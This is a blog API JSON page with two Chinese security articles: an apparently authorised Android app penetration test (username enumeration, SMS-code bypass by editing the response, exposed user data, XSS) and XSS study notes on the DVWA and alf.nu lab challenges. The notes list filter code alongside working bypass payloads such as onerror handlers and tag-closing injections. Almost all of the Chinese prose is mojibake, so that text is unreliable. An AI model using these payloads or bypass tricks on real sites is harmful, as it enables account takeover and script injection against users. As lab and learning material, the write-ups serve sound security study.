{"total":49,"pageSize":8,"pageCount":7,"data":[{"title":"APP Penetration testing","slug":"Penetration-testing","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:52.700Z","comments":true,"path":"api/articles/Penetration-testing.json","excerpt":"","keywords":null,"cover":"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w5qqs0j30ne0j9abm.jpg","content":"<h1 id=\"è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•\"><a href=\"#è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•\" class=\"headerlink\" title=\"è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•\"></a>è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•</h1><p>ä½œä¸ºä¸€ä¸ªæ¸—é€æµ‹è¯•å°ç™½ï¼Œæœ¬æ–‡çš„ç›®çš„æ˜¯å¸Œæœ›èƒ½ä¸ºé‚£äº›å’Œæˆ‘ä¸€æ ·çš„å°ç™½æä¾›ä¸€äº›æµ‹è¯•æ€è·¯ã€‚</p>\n<p>æ¶‰åŠçš„å†…å®¹å¯èƒ½æ¯”è¾ƒåŸºç¡€ï¼Œè¡¨å“¥ä»¬è§è°…ã€‚</p>\n<h2 id=\"APK-è§£åŒ…\"><a href=\"#APK-è§£åŒ…\" class=\"headerlink\" title=\"APK è§£åŒ…\"></a>APK è§£åŒ…</h2><p>æ‹¿åˆ° apk ä¹‹åç›´æ¥ç”¨ 7-Zip è§£å‹å¯ä»¥å¾—åˆ°å‡ ä¸ªæ–‡ä»¶å¤¹ã€ä¸€ä¸ª <strong>AndroidManifest.xml</strong> æ–‡ä»¶ã€ä¸€ä¸ªdexæ–‡ä»¶ã€‚ä½¿ç”¨ dex2jar <a href=\"https://sourceforge.net/projects/dex2jar/\" title=\"å·¥å…·\" target=\"_blank\" rel=\"noopener\">https://sourceforge.net/projects/dex2jar/</a> å°†è¿™ä¸ªdexæ–‡ä»¶è§£å‹ä¼šç”Ÿæˆä¸€ä¸ªjaræ–‡ä»¶ï¼Œç„¶åä½¿ç”¨jd-guiå°±å¯ä»¥æŸ¥çœ‹javaæºä»£ç äº†ã€‚</p>\n<p>å½“ç„¶å¯ä»¥ä»æºç é‡Œæ‰¾ä»£ç çš„æ¼æ´ï¼Œä½†æ˜¯ä¸€èˆ¬ä¼šæœ‰æ··æ·†ï¼Œåœ¨è¿™ä¹Ÿä¸åšæ·±å…¥è®¨è®ºã€‚</p>\n<p>ä¸Šè¾¹æåˆ°çš„ xml æ–‡ä»¶ä¸€å®šä¸èƒ½å‘æ”¾è¿‡ï¼Œé‡Œè¾¹æ¶‰åŠåˆ°è®¸å¤šé‡è¦çš„é…ç½®é¡¹ï¼Œæ¯”å¦‚ï¼š</p>\n<ul>\n<li>AndroidManifest.xmlæ–‡ä»¶ä¸­android:debuggableä¸ºtrueã€‚app å¯è¢«ä»»æ„è°ƒè¯•</li>\n<li>AndroidManifest.xmlæ–‡ä»¶ä¸­android: allowBackupä¸ºtrueã€‚app æ•°æ®å¯ä»¥è¢«å¤‡ä»½å¯¼å‡ºã€‚</li>\n<li>ç­‰ç­‰â€¦</li>\n</ul>\n<p>è¿˜æœ‰ä¸€ç‚¹åœ¨å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­å¯èƒ½ä¼šç”¨åˆ°ï¼šåœ¨å¯¹ apk è§£å‹ä¹‹åå¯ä»¥å°è¯•åœ¨ powershell é‡Œè¾¹æœä¸€ä¸‹ <code>db</code> æ–‡ä»¶ï¼Œè¯´ä¸å®šæœ‰æ•æ„Ÿä¿¡æ¯(ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Œå› ä¸ºæˆ‘ç¢°åˆ°è¿‡ä¸€æ¬¡â€¦)</p>\n<pre><code>for /r F:\\source-code %i in (*.db) do echo %i </code></pre><h2 id=\"ç™»é™†é¡µé¢\"><a href=\"#ç™»é™†é¡µé¢\" class=\"headerlink\" title=\"ç™»é™†é¡µé¢\"></a>ç™»é™†é¡µé¢</h2><h3 id=\"ç”¨æˆ·åå¯æšä¸¾\"><a href=\"#ç”¨æˆ·åå¯æšä¸¾\" class=\"headerlink\" title=\"ç”¨æˆ·åå¯æšä¸¾\"></a>ç”¨æˆ·åå¯æšä¸¾</h3><p>è¾“å…¥ç”¨æˆ·åä¹‹åå“åº”ç”¨æˆ·åä¸å­˜åœ¨ï¼Œè¿™å°±æ˜¯æœ€ç®€å•çš„æšä¸¾ç”¨æˆ·åçš„æƒ…å½¢äº†ã€‚</p>\n<p>è¿™æ¬¡ç¢°åˆ°çš„æ˜¯ç™»é™†ä¸éœ€è¦å¯†ç ï¼Œä½†æ˜¯è¦è¾“å…¥å·²ç»æ³¨å†Œè¿‡çš„ç”¨æˆ·åï¼Œä¹‹åä¼šæ ¹æ®ç”¨æˆ·åå‘é€éªŒè¯ç åˆ°å¯¹åº”æ‰‹æœºï¼ŒåŒæ—¶è®¾ç½®äº† 120s å†…ä¸èƒ½é‡æ–°å‘é€ï¼Œå¹¶ä¸”éªŒè¯ç  120s å†…æœ‰æ•ˆã€‚</p>\n<p>è¿™æ—¶å€™çœ‹èµ·æ¥æˆ‘ä»¬æ²¡åŠæ³•é€šè¿‡éªŒè¯ç åšä»€ä¹ˆäº‹ï¼Œä½†æ˜¯åœ¨å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°</p>\n<ol>\n<li><p>å½“æˆ‘ä»¬è¾“å…¥å­˜åœ¨çš„è´¦å·ä¹‹åæç¤ºå‘é€æˆåŠŸï¼›</p>\n</li>\n<li><p>é‡å¤å‘é€ï¼Œä¼šå“åº” 120s å†…ä¸èƒ½é‡å¤å‘é€ï¼›</p>\n</li>\n<li><p>è¾“å…¥ä¸å­˜åœ¨ç”¨æˆ·ä¼šæç¤ºå‘é€å¤±è´¥ã€‚</p>\n</li>\n</ol>\n<p>æ‰€ä»¥è¿™ä¸ªæ—¶é—´é™åˆ¶å¯¹ç”¨æˆ·åæšä¸¾å…¶å®æ²¡ä»€ä¹ˆå½±å“ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´ç”¨æˆ·åæ ¹æ®è¿”å›çš„ä¿¡æ¯æ¥æŸ¥çœ‹ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ã€‚</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w5qqs0j30ne0j9abm.jpg\" alt=\"æšä¸¾ç”¨æˆ·\"></p>\n<p>ç­‰ç­‰ï¼Œæ—¢ç„¶å’±éƒ½ä¸çŸ¥é“æ‰‹æœºå·ï¼Œä¹Ÿä¸è®©è¾“å¯†ç ç™»é™†ï¼Œå°±ç®—å¾—åˆ°ç”¨æˆ·åç”Ÿæˆç¤¾å·¥å­—å…¸ä¹Ÿæ²¡æ³•ç”¨å•Šï¼Œé‚£æ‹¿åˆ°äº†ç”¨æˆ·åæœ‰ä»€ä¹ˆç”¨ï¼Ÿ</p>\n<p>å½“ç„¶æœ‰ç”¨ï¼Œä¸è¿‡è¦çœ‹å…·ä½“åœºæ™¯ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªæ¡ˆä¾‹</p>\n<h3 id=\"ä»»æ„éªŒè¯ç ç»•è¿‡\"><a href=\"#ä»»æ„éªŒè¯ç ç»•è¿‡\" class=\"headerlink\" title=\"ä»»æ„éªŒè¯ç ç»•è¿‡\"></a>ä»»æ„éªŒè¯ç ç»•è¿‡</h3><p>å½“æˆ‘ä»¬ç™»é™†æ—¶æœåŠ¡ç«¯ç»™è´¦å·ç»‘å®šçš„æ‰‹æœºå·å‘é€çŸ­ä¿¡éªŒè¯ç ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªä¸Šä¸€æ­¥å¾—åˆ°çš„è´¦å·ï¼ŒéªŒè¯ç éšä¾¿è¾“ï¼Œç‚¹å‡»ç™»é™†åæŠ“åŒ…ï¼Œç™»é™†å¤±è´¥ï¼Œå‘ç°å“åº”ä¸­æœ‰ä¸¤ä¸ª code å­—æ®µ</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w9rlloj30l2070aaa.jpg\" alt></p>\n<p>æ”¹æ”¹è¯•è¯•ï¼š</p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1ga98wgjh7kj30is057mx6.jpg\" alt></p>\n<p><strong>It works!</strong></p>\n<h2 id=\"åŠŸèƒ½é¡µé¢\"><a href=\"#åŠŸèƒ½é¡µé¢\" class=\"headerlink\" title=\"åŠŸèƒ½é¡µé¢\"></a>åŠŸèƒ½é¡µé¢</h2><p>æˆåŠŸç™»å½•ä¹‹åï¼Œå„ä¸ªåŠŸèƒ½éƒ½ç‚¹ç‚¹çœ‹çœ‹ï¼Œåœ¨ä¸ªäººä¿¡æ¯é¡µé¢æœ‰ä¸€ä¸ªæŸ¥è¯¢å®æ—¶åœ¨çº¿äººæ•°åŠŸèƒ½ï¼Œé‚£ä¸€æ åªæ˜¾ç¤ºäº†äººæ•°ï¼Œæ—è¾¹å¹¶æ²¡æœ‰ç®­å¤´</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wd0il6j307n04bdfo.jpg\" alt></p>\n<p>æˆ‘ä¸€åº¦ä»¥ä¸ºé‚£é‡Œä¸èƒ½ç‚¹å‡»(äº‹å®ä¸Šå› ä¸ºæ•°æ®é‡å¤ªå¤§ï¼ŒåŠ è½½äº†å¥½é•¿æ—¶é—´ï¼Œæˆ‘ç›´æ¥ç‚¹è¿”å›äº†ï¼Œç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯è¿™é‡Œæ²¡æœ‰ä¸œè¥¿)ï¼Œè¿›å»ä¹‹åå°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰ç™»é™†äººå‘˜çš„ä¿¡æ¯äº†ã€‚</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98voejstj30qf09pdh7.jpg\" alt=\"å›¾æ‰“ç æ°´å¹³å®åœ¨ä¸å¤Ÿ\"></p>\n<p>åœ¨æˆ‘å°è¯•äº†ä¸åŒç”¨æˆ·ä¹‹åï¼Œå‘ç°è¿™é‡Œçš„ç”¨æˆ·ä¿¡æ¯å¹¶æ²¡æœ‰æƒé™é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼Œæ˜æ˜¾çš„æƒé™é…ç½®ä¸å½“ã€‚</p>\n<p>é™¤æ­¤ä¹‹å¤–ï¼Œåº”ç”¨å­˜åœ¨å‡ å¤„æŸ¥è¯¢åŠŸèƒ½ï¼Œé€šè¿‡BURP çœ‹åˆ°è¿”å›çš„æ•°æ®åŒ…éƒ½æ˜¯ JSON ç±»å‹</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wmervqj30m404vt90.jpg\" alt></p>\n<p>å› ä¸ºæ²¡ä»€ä¹ˆç»éªŒï¼Œæ‰€ä»¥å°±å¤šå°è¯•å—ï¼Œåœ¨ json é‚£é‡Œæ³¨å…¥ï¼Œxxe éƒ½æ¥ä¸€éï¼Œæ²¡å•¥ç”¨ã€‚</p>\n<p>å‰é¢è¿˜æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¯•è¯•ï¼Ÿ</p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1ga98x8llxwj30q203f74b.jpg\" alt></p>\n<p>æœ‰æˆï¼</p>\n<p>è¯•è¯• xss å§</p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1ga98xbyv4fj30q002q74d.jpg\" alt></p>\n<p>æ”¾åˆ°æµè§ˆå™¨æˆåŠŸå¼¹çª—ï¼</p>\n<h1 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h1><p>å¹³æ—¶åšæµ‹è¯•è¿˜æ˜¯è¦ç»†å¿ƒï¼Œå¤šæ€»ç»“ï¼Œæ¯ä¸€ä¸ªèƒ½è¾“å…¥çš„åœ°æ–¹éƒ½ä¸èƒ½æ”¾è¿‡ï¼Œå¤šè¯•è¯•æ€»æ˜¯å¥½çš„ã€‚</p>\n","text":"è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•ä½œä¸ºä¸€ä¸ªæ¸—é€æµ‹è¯•å°ç™½ï¼Œæœ¬æ–‡çš„ç›®çš„æ˜¯å¸Œæœ›èƒ½ä¸ºé‚£äº›å’Œæˆ‘ä¸€æ ·çš„å°ç™½æä¾›ä¸€äº›æµ‹è¯•æ€è·¯ã€‚æ¶‰åŠçš„å†…å®¹å¯èƒ½æ¯”è¾ƒåŸºç¡€ï¼Œè¡¨å“¥ä»¬è§è°…ã€‚APK è§£åŒ…æ‹¿åˆ° apk ä¹‹åç›´æ¥ç”¨ 7-Zip è§£å‹å¯ä»¥å¾—åˆ°å‡ ä¸ªæ–‡ä»¶å¤¹ã€ä¸€ä¸ª AndroidManifest.xml æ–‡ä»¶ã€ä¸€ä¸ªdexæ–‡ä»¶","link":"","raw":null,"photos":[],"categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","count":5,"path":"api/categories/æ¸—é€æµ‹è¯•.json"}],"tags":[{"name":"APK","slug":"APK","count":1,"path":"api/tags/APK.json"}]},{"title":"XSS å­¦ä¹ ","slug":"xsså¤‡å¿˜","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:51.496Z","comments":true,"path":"api/articles/xsså¤‡å¿˜.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"xsså¤‡å¿˜\"><a href=\"#xsså¤‡å¿˜\" class=\"headerlink\" title=\"xsså¤‡å¿˜\"></a>xsså¤‡å¿˜</h1><p>11/1/2019 10:50:21 AM </p>\n<h2 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"reflected\"><a href=\"#reflected\" class=\"headerlink\" title=\"reflected\"></a>reflected</h3><p><strong>low</strong></p>\n<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>&lt;scRiPt&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>&lt;?php\n\nheader (&quot;X-XSS-Protection: 0&quot;);\n\n// Is there any input?\nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {\n    // Get input\n    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );\n\n    // Feedback for end user\n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;\n}\n\n?&gt; </code></pre><p>é»‘åå•è¿‡æ»¤ï¼Œé‡‡ç”¨æ­£åˆ™ä¸åŒºåˆ†å¤§å°å†™ï¼ŒåŒå†™ã€å¤§å°å†™æ··æ·†ä¸è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–çš„äº‹ä»¶æ ‡ç­¾ï¼š</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); \n    // Feedback for end user \n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h2 id=\"Stored\"><a href=\"#Stored\" class=\"headerlink\" title=\"Stored\"></a>Stored</h2><p><strong>low</strong></p>\n<p>name å¤„é•¿åº¦é™åˆ¶ï¼Œ Message å¤„å°è¯• <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>\n<p><strong>medium</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p><code>strip_tages</code> ç§»é™¤å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ <code>&lt;b&gt;</code> æ ‡ç­¾ã€‚  <code>addslashes</code>  è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦(å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULL)ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼› <code>htmlspecialchars</code> å¯¹å‚æ•°è¿›è¡Œå®ä½“ç¼–ç ï¼Œæ— æ³•å†å¯¹ <code>message</code> è¿›è¡Œ XSS ï¼Œä½†æ˜¯ <code>name</code> å¤„å¯ä»¥é€šè¿‡ä¿®æ”¹é•¿åº¦è¿›è¡Œ xssã€‚</p>\n<pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p>ä¼¼æ›¾ç›¸è¯†å‘¢ğŸ˜‹</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \nif( isset( $_POST[ &apos;btnSign&apos; ] ) ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); \n    $name    = trim( $_POST[ &apos;txtName&apos; ] ); \n    // Sanitize message input \n    $message = stripslashes( $message ); \n    $message = mysql_real_escape_string( $message ); \n    $message = htmlspecialchars( $message ); \n    // Sanitize name input \n    $name = stripslashes( $name ); \n    $name = mysql_real_escape_string( $name ); \n    $name = htmlspecialchars( $name ); \n    // Update database \n    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); \n    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); \n    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); \n    $data-&gt;execute(); \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><p><strong>low</strong>    </p>\n<pre><code>?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n    $default = $_GET[&apos;default&apos;];\n\n    # Do not allow script tags\n    if (stripos ($default, &quot;&lt;script&quot;) !== false) {\n        header (&quot;location: ?default=English&quot;);\n        exit;\n    }\n} </code></pre><p>è¿‡æ»¤äº† <code>&lt;script</code> ,è§‚å¯Ÿé¡µé¢æºç ï¼Œæ‰‹åŠ¨é—­åˆäº‹ä»¶æ ‡ç­¾ <code>&lt;/option&gt;</code> ã€ <code>&lt;/select&gt;</code>ï¼Œç”±äºä»£ç åªæ£€æµ‹ <code>$default</code> ,äºæ˜¯æˆ‘ä»¬åé¢çš„ä»£ç å¯ä»¥é€ƒé€¸ã€‚</p>\n<p>payload:</p>\n<pre><code>?default=English&gt;1&lt;/option&gt;&lt;/select&gt;&lt;img src onerror=alert(1)&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n\n    # White list the allowable languages\n    switch ($_GET[&apos;default&apos;]) {\n        case &quot;French&quot;:\n        case &quot;English&quot;:\n        case &quot;German&quot;:\n        case &quot;Spanish&quot;:\n            # ok\n            break;\n        default:\n            header (&quot;location: ?default=English&quot;);\n            exit;\n    }\n}</code></pre><p>URL ä¸­æ‰€æœ‰åœ¨ # ä¹‹åçš„éƒ½ä¼šè¢«åˆ†å‰²ï¼Œä¸ä¼šå‘é€åˆ°æœåŠ¡ç«¯ï¼Œå› æ­¤ä¸ä¼šè¢«è¿‡æ»¤ï¼Œæ¶æ„ä»£ç ä¼šåœ¨åˆ›å»ºé¡µé¢æ—¶è¢«ç”¨æ¥æ¸²æŸ“<br>è¯»å–é¡µé¢å†…å®¹ã€‚</p>\n<p>payload:</p>\n<pre><code>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>æµè§ˆå™¨å¦‚ä½•æ¸²æŸ“ä¸€ä¸ªé¡µé¢ï¼Œæ‰¾åˆ°ä¸€ç¯‡å›½å¤–çš„æ–‡ç« ï¼š<a href=\"https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969\" target=\"_blank\" rel=\"noopener\">https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969</a></p>\n<p>HTMLäº‹ä»¶å±æ€§ï¼š<a href=\"https://www.w3school.com.cn/tags/html_ref_eventattributes.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>\n<h1 id=\"ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº\"><a href=\"#ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº\" class=\"headerlink\" title=\"ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº\"></a>ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº</h1><p>é¶åœºåœ°å€ï¼š<a href=\"https://alf.nu/alert1\" target=\"_blank\" rel=\"noopener\">https://alf.nu/alert1</a></p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„å€¼æ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œé—­åˆå‰é¢çš„æ ‡ç­¾å³å¯</p>\n<pre><code>1&quot;);alert(1)//    &lt;script&gt;console.log(&quot;1&quot;);alert(1)//&quot;);&lt;/script&gt;\n1&quot;);alert(1,&quot;     &lt;script&gt;console.log(&quot;1&quot;);alert(1,&quot;&quot;);&lt;/script&gt;</code></pre><h2 id=\"Adobe\"><a href=\"#Adobe\" class=\"headerlink\" title=\"Adobe\"></a>Adobe</h2><pre><code>function escape(s) {\n  s = s.replace(/&quot;/g, &apos;\\\\&quot;&apos;);\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„ <code>&quot;</code> åŠ äº†ä¸€ä¸ªè½¬ä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é—­åˆ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼Œæˆ–è€…ç”¨ <code>\\</code> å†æ¬¡è½¬ä¹‰</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//        &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;\n\n&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;     &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;);&lt;/script&gt;\n\n\\&quot;);alert(1)//                     &lt;script&gt;console.log(&quot;\\\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></pre><h2 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h2><pre><code>function escape(s) {\n  s = JSON.stringify(s);\n  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;\n}</code></pre><p>ä¸ç¬¬äºŒé¢˜ä¸€æ ·</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></pre><h3 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h3><pre><code>function escape(s) {\n  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);\n  // URLs\n  text = text.replace(/(http:\\/\\/\\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);\n  // [[img123|Description]]\n  text = text.replace(/\\[\\[(\\w+)\\|(.+?)\\]\\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);\n  return text;\n}</code></pre><p>ç¬¬ä¸€è¡Œè¿‡æ»¤å°†æ‰€æœ‰ <code>&lt; &quot;</code> è¿›è¡Œå®ä½“ç¼–ç </p>\n<p>ç¬¬äºŒè¡Œå°†æ‰€æœ‰ <code>http://S+</code> æ›¿æ¢ä¸º <code>&lt;a href=&quot;https://S+&quot;&gt;htp://S+&lt;/a&gt;</code> ,è¿™é‡Œ S+ ä¸ºåŒ¹é…ä¸€ä¸ªéç©ºç™½å­—ç¬¦ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚</p>\n<p>ç¬¬ä¸‰è¡Œå°† <code>[[a|b]]</code> æ›¿æ¢ä¸º <code>&lt;img alt=&quot;b&quot; src=&quot;a.gif&quot;&gt;</code></p>\n<p>payload: <code>[[a|http://onerror=alert(1)//]]</code></p>\n<p>è¾“å‡ºï¼š</p>\n<pre><code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=alert(1)//&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=alert(1)//]]&lt;/a&gt;</code></pre><p>é€šè¿‡ <code>http://onerror=alert(1)//</code> å¼•å…¥ <code>alt=&quot;***&quot;</code> ,æ­¤æ—¶å¼•å·å†…çš„å†…å®¹è§¦å‘ç¬¬äºŒè¡Œçš„æ£€æµ‹ æ›¿æ¢ä¸º<code>&lt;a href=&quot;http://onerror=alert(1)//&quot;&gt;http://onerror=alert(1)//&lt;/a&gt;</code> æ­¤æ—¶ <code>href</code> å¸¦æ¥çš„ <code>&quot;</code> å°† <code>alt</code> çš„å¼•å·é—­åˆï¼ŒåŒæ—¶ <code>//</code> å°†åé¢çš„ä»£ç æ³¨é‡Šæ‰ï¼Œé€ æˆ <code>http://onerror=alert(1)</code> é€ƒé€¸å‡ºæ¥ã€‚</p>\n<h3 id=\"DOM-1\"><a href=\"#DOM-1\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><pre><code>function escape(s) {\n  // Slightly too lazy to make two input fields.\n  // Pass in something like &quot;TextNode#foo&quot;\n  var m = s.split(/#/);\n\n  // Only slightly contrived at this point.\n  var a = document.createElement(&apos;div&apos;);\n  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));\n  return a.innerHTML;\n}</code></pre><p>é€šè¿‡ <code>split</code> å¯¹ä¼ å…¥çš„ s è¿›è¡Œåˆ†å‰²<br>    var s=â€creat#fooâ€; var m=s.split(/#/); m<br>    Array [ â€œcreatâ€, â€œfooâ€ ]</p>\n<pre><code>document[&apos;create&apos;+m[0]].apply(document, m.slice(1)) </code></pre><p>ç›¸å½“äºè°ƒç”¨äº† document.creatXXX() 